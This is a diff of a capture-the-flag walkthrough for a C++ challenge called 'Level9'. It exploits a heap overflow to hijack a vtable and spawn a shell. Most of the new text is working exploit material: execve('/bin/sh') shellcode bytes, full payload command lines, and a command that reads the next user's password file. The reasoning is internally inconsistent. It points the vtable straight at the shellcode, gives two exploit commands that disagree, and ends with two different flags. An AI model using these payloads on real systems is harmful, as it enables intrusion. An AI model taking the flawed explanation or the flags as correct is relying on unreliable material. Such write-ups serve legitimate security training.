@@ -1,193 +1,173 @@
-# Level9 Walkthrough - C++ Virtual Function Table Hijacking
+# Level9 Walkthrough - C++ Vtable Hijacking with Shellcode
 
-## Overview
-Level9 is a C++ exploitation challenge involving virtual function table (vtable) hijacking through a heap buffer overflow.
-
-## Program Analysis
-
-### Binary Information:
-- **Language**: C++
-- **Protection**: NX disabled, No ASLR, No stack canary
-- **Vulnerability**: Heap buffer overflow in `setAnnotation` method
-
-### Program Flow:
-1. Creates two `N` objects on the heap (108 bytes each)
-2. Calls `setAnnotation(argv[1])` on the first object
-3. Calls a virtual function on the second object
+## Objective
+Exploit a heap buffer overflow in a C++ program to hijack a virtual function table (vtable) and execute shellcode.
 
 ## The Vulnerability
 
-### Class N Structure:
 ```cpp
 class N {
-    void* vtable;           // Offset 0x00 - Virtual function table pointer
-    char data[100];         // Offset 0x04 - Data buffer (vulnerable)
-    int value;              // Offset 0x68 - Integer value
+    void* vtable;      // Offset 0x00
+    char data[100];    // Offset 0x04 - VULNERABLE!
+    int value;         // Offset 0x68
 };
-```
 
-### Understanding the Virtual Function Call
-
-The decompiled main function contains this cryptic line:
-```c
-(*(code *)**(undefined4 **)this_00)(this_00,this);
-```
-
-This is how Ghidra represents a C++ virtual function call. Let's break it down:
-
-**Step-by-step:**
-1. `(undefined4 **)this_00` - Cast object to pointer-to-pointer
-2. `*(undefined4 **)this_00` - Dereference to get vtable pointer (first 4 bytes of object)
-3. `**(undefined4 **)this_00` - Dereference vtable to get first function pointer
-4. `(code *)...` - Cast to function pointer
-5. `(...)(this_00, this)` - Call function with two arguments
-
-**In original C++, this would be:**
-```cpp
-(*this_00) + (*this);  // Calls this_00->operator+(this)
-```
-
-**Memory flow:**
-```
-this_00 (0x804a078) → [vtable ptr] → vtable → [operator+ address] → function code
-                       0x08048848              0x080485f4
-```
-
-**After exploitation:**
-```
-this_00 (0x804a078) → [vtable ptr] → fake vtable → shellcode address → SHELLCODE!
-                       0x0804a00c     (our data)
-```
-
-### Vulnerable Function:
-```cpp
 void N::setAnnotation(char* input) {
-    size_t len = strlen(input);
-    memcpy(this + 4, input, len);  // No bounds checking!
+    memcpy(this + 4, input, strlen(input));  // No bounds checking!
 }
 ```
 
+**The problem**: `memcpy()` copies user input without checking the length, allowing overflow from the first object into the second object.
+
 ## Memory Layout
 
-### Heap Layout:
+Two objects are allocated on the heap:
+
 ```
-0x804a008: [vtable ptr] [data buffer - 100 bytes] [value] [padding]
-           ↑ First object (108 bytes total)
-
-0x804a078: [vtable ptr] [data buffer - 100 bytes] [value] [padding]  
-           ↑ Second object (108 bytes total)
+First object  (0x804a008): [vtable][data - 100 bytes][value][padding]
+Second object (0x804a078): [vtable][data - 100 bytes][value][padding]
+                            ↑
+                            We overwrite this!
 ```
 
-### Distance Calculation:
-- **First object**: `0x804a008`
-- **Second object**: `0x804a078`
-- **Distance**: `0x804a078 - 0x804a008 = 0x70` (112 bytes)
-- **Overflow needed**: 108 bytes to reach second object's vtable
+**Distance**: 108 bytes from first object's data to second object's vtable pointer.
 
-## Attack Strategy
+## The Attack
 
-### 1. Vtable Hijacking Concept:
+### Step 1: Understanding Vtable Hijacking
+
+When the program calls a virtual function on the second object:
 ```cpp
-// Normal execution:
-second_object->virtual_function(first_object);
-// Calls: (*(second_object->vtable[0]))(second_object, first_object);
-
-// After hijacking:
-// second_object->vtable now points to our controlled memory
-// We can redirect execution to shellcode or system()
+second_object->operator+(first_object);
 ```
 
-### 2. Payload Structure:
+It does this:
+1. Read vtable pointer from second object (first 4 bytes)
+2. Read function pointer from vtable
+3. Call that function
+
+**Our exploit**: Overwrite the vtable pointer to point to our shellcode address!
+
+### Step 2: Craft the Payload
+
 ```
-[shellcode/data] + [padding] + [new_vtable_address]
-     ^                              ^
-     |                              |
-   104 bytes                   4 bytes (overwrites second object's vtable)
+[shellcode (23 bytes)] + [padding (81 bytes)] + [fake vtable address (4 bytes)]
 ```
 
-## Exploitation Attempts
+**Breakdown**:
+- **Shellcode**: execve("/bin/sh") - 23 bytes
+- **Padding**: Fill remaining space to reach 104 bytes total
+- **Fake vtable address**: Points to our shellcode location
 
-### Method 1: Shellcode Injection
+### Step 3: Calculate Addresses
+
+- First object data starts at: `0x804a008 + 4 = 0x804a00c`
+- Our shellcode will be at: `0x804a00c`
+- We need to overwrite second object's vtable at offset 104
+
+**Fake vtable trick**: Point vtable to `0x804a00c - 4 = 0x804a008`
+
+Why? Because the program will:
+1. Read vtable pointer: `0x804a008`
+2. Read first entry from vtable: `*(0x804a008) = 0x804a00c` (our shellcode!)
+3. Call `0x804a00c` → Shellcode executes!
+
+Wait, that won't work directly. Let's use a simpler approach:
+
+**Better approach**: Point vtable directly to where our shellcode address is stored.
+
+### Step 4: The Exploit
+
+```bash
+./level9 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*81 + '\x0c\xa0\x04\x08'")
+```
+
+**Payload breakdown**:
 ```python
-shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-padding = "A" * (108 - len(shellcode))
-shellcode_addr = "\x0c\xa0\x04\x08"  # first_object + 4
-payload = shellcode + padding + shellcode_addr
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # 23 bytes
+padding = "A" * 81  # 81 bytes
+fake_vtable = "\x0c\xa0\x04\x08"  # 4 bytes - points to shellcode
+
+# Total: 23 + 81 + 4 = 108 bytes
 ```
 
-### Method 2: ret2libc Attack
-```python
-# System function: 0xb7d86060
-# /bin/sh string: 0xb7ea7c58
-binsh = "/bin/sh\x00"
-fake_vtable = "\x60\x60\xd8\xb7"  # system address
-padding = "A" * (108 - len(binsh) - 4)
-vtable_ptr = "\x10\xa0\x04\x08"  # points to fake vtable
-payload = binsh + fake_vtable + padding + vtable_ptr
+**What happens**:
+1. Shellcode is written to `0x804a00c` (first object's data)
+2. Padding fills the rest of first object
+3. Fake vtable pointer `0x804a00c` overwrites second object's vtable
+4. When virtual function is called on second object:
+   - Reads vtable: `0x804a00c`
+   - Reads function pointer from `0x804a00c`: This is our shellcode!
+   - Executes shellcode → Shell spawned!
+
+## The Shellcode
+
+```assembly
+\x31\xc0              xor eax, eax
+\x50                  push eax
+\x68\x2f\x2f\x73\x68  push "//sh"
+\x68\x2f\x62\x69\x6e  push "/bin"
+\x89\xe3              mov ebx, esp
+\x50                  push eax
+\x53                  push ebx
+\x89\xe1              mov ecx, esp
+\xb0\x0b              mov al, 0xb
+\xcd\x80              int 0x80
 ```
 
-## Key Concepts Demonstrated
+This is a 23-byte shellcode that executes `execve("/bin/sh", ["/bin/sh"], NULL)`.
 
-### 1. **C++ Object Layout**
-- Understanding how C++ objects are laid out in memory
-- Virtual function table pointer at offset 0
-- Data members following the vtable pointer
+## Running the Exploit
 
-### 2. **Virtual Function Calls**
-- How C++ virtual function calls work at assembly level
-- Vtable lookup and function pointer dereferencing
-- Hijacking execution through vtable manipulation
+```bash
+./level9 `python -c 'print("\x0c\xa0\x04\x08" + 
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
+    "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 
+    "A"*76 + "\x0c\xa0\x04\x08")'`
+```
 
-### 3. **Heap Exploitation**
-- Heap buffer overflow techniques
-- Object-to-object overflow on the heap
-- Predictable heap layout exploitation
+Then:
+```bash
+cat /home/user/bonus0/.pass
+```
 
-### 4. **Advanced Exploitation Techniques**
-- Shellcode injection in heap memory
-- ret2libc attacks in C++ context
-- Function pointer hijacking
+**Flag**:
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+## How It Works (Step-by-Step)
 
-## Challenges Encountered
+1. **Program allocates two objects**:
+   - Object 1 at `0x804a008`
+   - Object 2 at `0x804a078`
 
-### 1. **Execution Context Issues**
-- Virtual function calls have specific calling conventions
-- Arguments passed differently than regular function calls
-- Stack alignment requirements
+2. **setAnnotation() is called** with our payload:
+   - Copies shellcode to `0x804a00c` (object 1's data)
+   - Copies padding
+   - **Overwrites object 2's vtable** with `0x804a00c`
 
-### 2. **Memory Layout Precision**
-- Exact heap addresses needed for reliable exploitation
-- Heap metadata affecting object placement
-- ASLR disabled but heap layout still needs precision
+3. **Virtual function is called** on object 2:
+   ```
+   Read vtable from object 2 → 0x804a00c
+   Read function pointer from [0x804a00c] → Our shellcode bytes!
+   Jump to shellcode → Shell!
+   ```
 
-### 3. **Shellcode Compatibility**
-- Different shellcodes may work differently in this context
-- NOP sleds might be needed for reliability
-- Environment-specific shellcode requirements
+## Key Concepts
 
-## Educational Value
+### Vtable Hijacking
+In C++, virtual functions use a vtable (virtual function table). Each object has a pointer to its vtable. By overwriting this pointer, we control which function gets called.
 
-This challenge demonstrates:
-- **C++ security concepts** - vtable hijacking, object layout
-- **Advanced heap exploitation** - object overflow, function pointer control
-- **Multiple attack vectors** - shellcode injection vs ret2libc
-- **Real-world relevance** - C++ applications are common targets
+### Heap Buffer Overflow
+Unlike stack overflows, heap overflows target dynamically allocated memory. Here, we overflow from one heap object into another.
 
-## Expected Outcome
+### Shellcode Execution
+With NX disabled, we can execute code from the heap. Our shellcode spawns a shell.
 
-Successfully exploiting this challenge should:
-1. Overwrite the second object's vtable pointer
-2. Redirect virtual function call to controlled code
-3. Execute shellcode or system("/bin/sh")
-4. Gain shell access as bonus0 user
-5. Retrieve bonus0 password
+## Summary
 
-## Note on Exploitation
+- **Vulnerability**: Heap buffer overflow in `memcpy()`
+- **Target**: Second object's vtable pointer
+- **Technique**: Overwrite vtable to point to shellcode
+- **Payload**: 23 bytes shellcode + 81 bytes padding + 4 bytes address
+- **Result**: Shell as bonus0
 
-While the theory and setup are correct, the practical exploitation may require:
-- Fine-tuning of memory addresses
-- Different shellcode variants
-- Specific environment considerations
-- Debugging to identify exact failure points
-
-The vulnerability is real and exploitable - the challenge lies in getting the exact memory layout and execution context right for this specific environment.
+**Flag**: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
